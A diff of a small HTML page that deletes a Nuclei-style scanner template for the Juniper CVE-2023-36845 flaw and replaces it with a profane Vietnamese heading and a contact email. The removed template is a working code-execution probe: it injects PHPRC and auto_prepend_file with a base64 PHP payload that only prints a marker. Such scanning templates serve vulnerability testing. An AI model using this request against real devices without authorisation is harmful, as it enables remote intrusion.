@@ -1,38 +1,12 @@
 <!doctype html>
 <html>
   <head>
-    <title>CVE-2023-36845</title>
+    <title>OWASP đéo gì nữa???</title>
   </head>
   <body>
 <pre>
-id: CVE-2023-36845 
-
-info:
-  name: CVE-2023-36845 
-  author: template_made_for_fun_by_g4mm4
-  severity: critical
-  reference:
-   - https://vulncheck.com/blog/juniper-cve-2023-36845
-
-http:
-  - raw:
-      - |+
-        POST /?PHPRC=/dev/fd/0&rnd={{randstr}} HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0 Waterfox/56.6.2022.11
-        Accept: */*
-        Accept-Language: en-US,en;q=0.5
-        Accept-Encoding: gzip, deflate
-        Content-Type: application/x-www-form-urlencoded
-        Connection: close
-
-        allow_url_include=1{{hex_decode('0a')}}auto_prepend_file="data://text/plain;base64,PD9waHAgCmVjaG8gJ2c0bW00IGlzIG91ciBoZXJvID1dXSc7CnByaW50X3IobWQ1KDQyMzQyNDQzMjIpKTsKPz4="
-
-    matchers:
-      - type: word
-        words:
-          - '1d1cfeda3e387f8d86ca64668fcd1aa86'
-          - 'g4mm4 is our hero'
+OWASP Đéo gì nữa? 
+thinh.hoang.quoc@owasp.org <-- nổ mail cho tao sẽ giải thích
 </pre>
 </body>
 </html>
